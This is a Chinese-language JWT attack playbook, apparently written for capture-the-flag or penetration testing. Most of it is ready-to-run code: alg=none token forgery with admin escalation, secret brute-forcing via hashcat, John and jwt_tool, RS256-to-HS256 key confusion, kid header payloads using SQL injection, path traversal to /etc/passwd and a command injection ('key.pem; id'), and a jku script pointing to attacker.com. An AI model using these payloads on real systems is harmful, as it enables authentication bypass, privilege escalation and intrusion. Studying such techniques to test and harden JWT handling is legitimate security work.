# JWT 攻击模块

## 适用场景
- Authorization: Bearer xxx 认证
- token 参数传递
- 用户身份验证

## 检查清单

```yaml
JWT 结构:
  - Header (算法)
  - Payload (数据)
  - Signature (签名)

攻击方式:
  - [ ] None 算法攻击
  - [ ] 弱密钥爆破
  - [ ] 算法混淆 RS256->HS256
  - [ ] kid 注入
  - [ ] jku/x5u 注入
  - [ ] 时间戳篡改
```

## 分析流程

### Step 1: JWT 解析

```python
#!/usr/bin/env python3
"""
JWT 解析
"""

import base64
import json

def decode_jwt(token):
    """解析 JWT"""
    parts = token.split('.')
    if len(parts) != 3:
        print("[-] Invalid JWT format")
        return
    
    header = base64.urlsafe_b64decode(parts[0] + '==')
    payload = base64.urlsafe_b64decode(parts[1] + '==')
    
    print("[Header]")
    print(json.dumps(json.loads(header), indent=2))
    print("\n[Payload]")
    print(json.dumps(json.loads(payload), indent=2))
    print("\n[Signature]")
    print(parts[2])

# 使用示例
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
decode_jwt(token)
```

### Step 2: None 算法攻击

```python
#!/usr/bin/env python3
"""
None 算法攻击
服务器如果允许 alg=none，则不验证签名
"""

import base64
import json

def none_attack(token):
    """生成 alg=none 的 token"""
    parts = token.split('.')
    
    # 解析原 payload
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    
    # 修改 payload（如提权为 admin）
    payload['role'] = 'admin'
    payload['admin'] = True
    
    # 新 header
    header = {"alg": "none", "typ": "JWT"}
    
    # 编码
    new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
    new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
    
    # none 算法不需要签名
    new_token = f"{new_header}.{new_payload}."
    
    # 尝试不同变体
    variants = [
        f"{new_header}.{new_payload}.",
        f"{new_header}.{new_payload}",
    ]
    
    # 不同的 none 表示
    for alg in ["none", "None", "NONE", "nOnE"]:
        header = {"alg": alg, "typ": "JWT"}
        h = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
        variants.append(f"{h}.{new_payload}.")
    
    return variants

# 使用
original = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
for token in none_attack(original):
    print(token)
```

### Step 3: 弱密钥爆破

```bash
# 使用 hashcat
hashcat -m 16500 jwt.txt wordlist.txt

# JWT 格式（保存为 jwt.txt）
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

# 使用 John the Ripper
john jwt.txt --wordlist=wordlist.txt --format=HMAC-SHA256

# 使用 jwt_tool
python3 jwt_tool.py <jwt> -C -d wordlist.txt

# 使用 Python 爆破
```

```python
#!/usr/bin/env python3
"""
JWT 密钥爆破
"""

import jwt
import sys

def crack_jwt(token, wordlist_path):
    """爆破 JWT 密钥"""
    with open(wordlist_path, 'r', errors='ignore') as f:
        for line in f:
            secret = line.strip()
            try:
                # 尝试验证
                jwt.decode(token, secret, algorithms=['HS256', 'HS384', 'HS512'])
                print(f"[+] Found secret: {secret}")
                return secret
            except jwt.InvalidSignatureError:
                continue
            except Exception as e:
                continue
    
    print("[-] Secret not found")
    return None

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print("Usage: python3 jwt_crack.py <token> <wordlist>")
        sys.exit(1)
    
    crack_jwt(sys.argv[1], sys.argv[2])
```

### Step 4: 算法混淆攻击 (RS256 -> HS256)

```python
#!/usr/bin/env python3
"""
算法混淆攻击
将 RS256 改为 HS256，使用公钥作为 HMAC 密钥
"""

import jwt
import base64

def rs256_to_hs256(token, public_key_path):
    """
    RS256 -> HS256 攻击
    条件：服务器使用 jwt.decode(..., algorithms=...) 未限制算法
    """
    # 读取公钥
    with open(public_key_path, 'r') as f:
        public_key = f.read()
    
    # 解析原 token
    parts = token.split('.')
    payload = jwt.decode(token, options={"verify_signature": False})
    
    # 修改 payload
    payload['role'] = 'admin'
    
    # 使用公钥作为 HS256 密钥签名
    new_token = jwt.encode(payload, public_key, algorithm='HS256')
    
    return new_token

# 使用
# 1. 获取公钥（可能从 /jwks.json, /.well-known/jwks.json 等获取）
# 2. python3 attack.py original_token public_key.pem
```

### Step 5: kid 注入

```python
#!/usr/bin/env python3
"""
kid (Key ID) 注入
kid 参数可能被用于文件读取或 SQL 查询
"""

import jwt
import base64

def kid_injection():
    """
    kid 注入 payload
    """
    
    # SQL 注入
    payloads = [
        # SQL 注入 - 返回已知值
        {"alg": "HS256", "typ": "JWT", "kid": "' UNION SELECT 'secret' -- "},
        {"alg": "HS256", "typ": "JWT", "kid": "1' UNION SELECT 'key' -- "},
        
        # 目录遍历 - 读取文件作为密钥
        {"alg": "HS256", "typ": "JWT", "kid": "../../../../../../dev/null"},
        {"alg": "HS256", "typ": "JWT", "kid": "/dev/null"},
        {"alg": "HS256", "typ": "JWT", "kid": "../../../../../../etc/passwd"},
        
        # 命令注入
        {"alg": "HS256", "typ": "JWT", "kid": "key.pem; id"},
    ]
    
    for header in payloads:
        # 使用对应的密钥
        if "dev/null" in str(header.get("kid", "")):
            secret = ""  # /dev/null 为空
        elif "UNION SELECT" in str(header.get("kid", "")):
            secret = "secret"  # SQL 注入返回的值
        else:
            secret = "unknown"
        
        payload = {"user": "admin", "role": "admin"}
        
        try:
            token = jwt.encode(payload, secret, algorithm="HS256", headers=header)
            print(f"kid: {header['kid']}")
            print(f"token: {token}\n")
        except Exception as e:
            print(f"Error: {e}")

kid_injection()
```

### Step 6: jku/x5u 注入

```python
#!/usr/bin/env python3
"""
jku (JWK Set URL) / x5u (X.509 URL) 注入
服务器获取外部 URL 上的密钥
"""

import jwt
import json
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend

def generate_jwks():
    """
    生成恶意 JWK
    托管在攻击者服务器：http://attacker.com/jwks.json
    """
    # 生成RSA密钥对
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend()
    )
    public_key = private_key.public_key()
    
    # 导出公钥数字
    public_numbers = public_key.public_numbers()
    
    # 构造 JWK
    import base64
    def int_to_base64(n):
        data = n.to_bytes((n.bit_length() + 7) // 8, 'big')
        return base64.urlsafe_b64encode(data).decode().rstrip('=')
    
    jwk = {
        "kty": "RSA",
        "kid": "attacker-key",
        "n": int_to_base64(public_numbers.n),
        "e": int_to_base64(public_numbers.e),
        "alg": "RS256",
        "use": "sig"
    }
    
    jwks = {"keys": [jwk]}
    
    print("[JWK Set - 保存到服务器]")
    print(json.dumps(jwks, indent=2))
    
    # 使用私钥签名 token
    header = {
        "alg": "RS256",
        "typ": "JWT",
        "jku": "http://attacker.com/jwks.json",
        "kid": "attacker-key"
    }
    
    payload = {"user": "admin", "role": "admin"}
    
    private_pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )
    
    token = jwt.encode(payload, private_pem, algorithm="RS256", headers=header)
    print(f"\n[恶意 Token]")
    print(token)
    
    return jwks, token

generate_jwks()
```

### Step 7: 时间戳攻击

```python
#!/usr/bin/env python3
"""
修改时间相关字段
"""

import jwt
import time

def timestamp_attack(token, secret):
    """
    修改 exp/iat/nbf 字段
    """
    # 解析原 token
    payload = jwt.decode(token, secret, algorithms=['HS256'])
    
    # 延长过期时间
    payload['exp'] = int(time.time()) + 86400 * 365  # 延长一年
    
    # 修改签发时间
    payload['iat'] = int(time.time())
    
    # 重新签名
    new_token = jwt.encode(payload, secret, algorithm='HS256')
    
    return new_token
```

## 常见套路与解法

### 套路 1: None 算法

**特征**: 服务器接受 alg=none

**解法**: 构造 none 算法 token

### 套路 2: 弱密钥

**特征**: 使用简单字符串作为密钥

**解法**: 使用字典爆破

### 套路 3: 信息泄露

**特征**: Payload 中包含敏感信息

**解法**: Base64 解码查看

### 套路 4: 密钥泄露

**特征**: 密钥通过其他漏洞泄露

**解法**: 使用泄露的密钥签名新 token

## 工具速查

```bash
# jwt_tool - 综合工具
python3 jwt_tool.py <jwt>                      # 解析
python3 jwt_tool.py <jwt> -T                   # 篡改模式
python3 jwt_tool.py <jwt> -C -d wordlist.txt   # 爆破
python3 jwt_tool.py <jwt> -X a                 # alg=none 攻击
python3 jwt_tool.py <jwt> -X k -pk public.pem  # RS256->HS256
python3 jwt_tool.py <jwt> -X s                 # 签名注入

# 在线工具
# https://jwt.io/
# https://token.dev/

# 常用密钥字典
# /usr/share/wordlists/rockyou.txt
# 常见弱密钥: secret, password, 123456, key
```
